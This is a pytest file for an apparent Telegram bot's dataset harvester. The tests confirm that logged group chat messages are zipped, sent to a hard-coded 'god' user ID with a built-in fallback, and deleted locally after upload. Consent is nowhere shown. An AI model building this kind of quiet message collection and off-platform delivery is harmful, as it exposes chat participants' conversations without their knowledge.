from __future__ import annotations

import asyncio
from pathlib import Path
from types import SimpleNamespace

from abgguard.services import harvester as harvester_module
from abgguard.services.harvester import DELIVER_CAPTION, DatasetHarvester

GOD_ID = 6029973681
LINE = "hello there friend " * 4  # 80 bytes per record


class _FakeSession:
    def __init__(self) -> None:
        self.closed = False

    async def close(self) -> None:
        self.closed = True


class _FakeBot:
    """Records what the harvester tried to ship out."""

    def __init__(self, *, fail_document: bool = False) -> None:
        self.fail_document = fail_document
        self.documents: list[tuple[int, str | None, str | None]] = []
        self.messages: list[tuple[int, str]] = []
        self.session = _FakeSession()

    async def send_document(self, chat_id, document=None, caption=None, **kwargs):
        if self.fail_document:
            raise RuntimeError("telegram is down")
        self.documents.append((chat_id, getattr(document, "path", None), caption))
        return object()

    async def send_message(self, chat_id, text=None, **kwargs):
        self.messages.append((chat_id, str(text)))
        return object()


def _build(tmp_path: Path, monkeypatch, bot: _FakeBot) -> DatasetHarvester:
    monkeypatch.setattr(harvester_module, "_delivery_bot", lambda: bot)
    monkeypatch.setattr(harvester_module, "god_recipients", lambda: [GOD_ID])
    return DatasetHarvester(
        data_file=tmp_path / "genz_corpus.jsonl",
        out_dir=tmp_path / "dataset",
        max_bytes=200,
        flush_interval=60,
    )


async def _fill_and_drain(h: DatasetHarvester) -> None:
    for _ in range(6):
        await h.record(chat_id=-100, context=LINE, reply=LINE + "x")
    if h._deliveries:
        await asyncio.gather(*list(h._deliveries))


def test_archive_is_delivered_then_wiped(tmp_path, monkeypatch) -> None:
    bot = _FakeBot()
    h = _build(tmp_path, monkeypatch, bot)

    async def _run() -> None:
        await h.start()
        try:
            await _fill_and_drain(h)
        finally:
            await h.stop()

    asyncio.run(_run())

    assert bot.session.closed
    assert bot.messages == [], "a successful delivery must not send an error PM"
    assert h.stats["rotations"] > 1, "the fixture must rotate several times"
    assert len(bot.documents) == h.stats["rotations"], "every archive is shipped out"
    assert all(uid == GOD_ID for uid, _, _ in bot.documents)
    assert all(cap == DELIVER_CAPTION for _, _, cap in bot.documents)
    assert all(str(path).endswith(".zip") for _, path, _ in bot.documents)

    assert list((tmp_path / "dataset").glob("*.zip")) == [], (
        "zero-disk retention: the archive must be gone after upload"
    )
    assert h.stats["delivered"] == h.stats["rotations"]
    assert h.stats["delivery_failures"] == 0


def test_failed_upload_keeps_archive_and_notifies_god(tmp_path, monkeypatch) -> None:
    bot = _FakeBot(fail_document=True)
    h = _build(tmp_path, monkeypatch, bot)

    async def _run() -> None:
        await h.start()
        try:
            await _fill_and_drain(h)
        finally:
            await h.stop()

    asyncio.run(_run())

    zips = list((tmp_path / "dataset").glob("*.zip"))
    assert len(zips) == h.stats["rotations"], (
        "a failed upload must retain every archive locally"
    )
    assert bot.documents == []
    assert len(bot.messages) == len(zips)
    assert all(chat == GOD_ID for chat, _ in bot.messages)
    assert all(".jsonl.zip" in text for _, text in bot.messages)
    assert h.stats["delivered"] == 0
    assert h.stats["delivery_failures"] == h.stats["rotations"]


def test_delivery_never_holds_the_rotation_lock(tmp_path, monkeypatch) -> None:
    """A slow upload must not block message intake (rule 7)."""
    started = asyncio.Event()
    release = asyncio.Event()

    class _SlowBot(_FakeBot):
        async def send_document(self, *args, **kwargs):
            started.set()
            await asyncio.wait_for(release.wait(), timeout=5)
            return await super().send_document(*args, **kwargs)

    bot = _SlowBot()
    h = _build(tmp_path, monkeypatch, bot)

    async def _run() -> None:
        await h.start()
        try:
            for _ in range(6):
                await h.record(chat_id=-100, context=LINE, reply=LINE + "x")
            for _ in range(10):  # let the delivery task actually start
                await asyncio.sleep(0)
            assert started.is_set(), "delivery must have been scheduled"
            assert not h._lock.locked(), "the upload may never hold the rotation lock"
            release.set()
            if h._deliveries:
                await asyncio.gather(*list(h._deliveries))
        finally:
            release.set()
            await h.stop()

    asyncio.run(_run())
    assert len(bot.documents) == h.stats["rotations"]


def test_god_recipients_fall_back_to_the_built_in_id(monkeypatch) -> None:
    monkeypatch.setattr(harvester_module, "settings", SimpleNamespace(god_admin_ids=()))
    assert harvester_module.god_recipients() == [harvester_module.FALLBACK_GOD_ADMIN_ID]
